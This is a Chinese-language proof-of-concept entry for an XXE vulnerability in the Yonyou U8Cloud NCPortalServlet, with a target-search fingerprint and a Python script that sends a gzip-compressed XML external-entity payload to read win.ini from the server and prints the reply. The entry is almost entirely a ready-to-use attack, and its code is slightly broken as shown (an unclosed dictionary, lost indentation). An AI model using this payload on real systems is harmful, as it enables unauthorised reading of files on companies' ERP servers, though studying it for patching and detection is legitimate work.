# 用友U8CloudNCPortalServlet存在XXE漏洞

- **系统**：用友　|　**类型**：XXE　|　**CVE**：—
- **指纹**：`title="U8C"`

**请求体 / payload**
```
import gzip
import requests
import io
# 构造 XML 内容，使用 &#x25; 替代 %
content = '''<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///C://windows/win.ini">]>
<data>
<transinfo type="portal_login">
<accountcode>&xxe;</accountcode>
</transinfo>
</data>'''
# GZIP 压缩
compressed_content = gzip.compress(content.encode('utf-8'))
# 目标地址
url = 'http://IP/servlet/~uap/nc.merp.bs.maportal.NCPortalServlet'
# 设置代理
proxies = {
'http': 'http://127.0.0.1:8083',
'https': 'http://127.0.0.1:8083'
# 发送请求
try:
response = requests.post(
url=url,
data=compressed_content,
proxies=proxies  # 添加代理配置
)
print("请求成功，状态码：", response.status_code)
# 尝试自动解压 GZIP 响应
if response.headers.get('Content-Encoding') == 'gzip' or response.content.startswith(b'\x1f\x8b'):
buf = io.BytesIO(response.content)
with gzip.GzipFile(fileobj=buf) as f:
content = f.read().decode('utf-8')
else:
content = response.text
print("响应内容：")
print(content)
except Exception as e:
print("请求失败，错误信息：", e)
```
- **预期**：200　|　—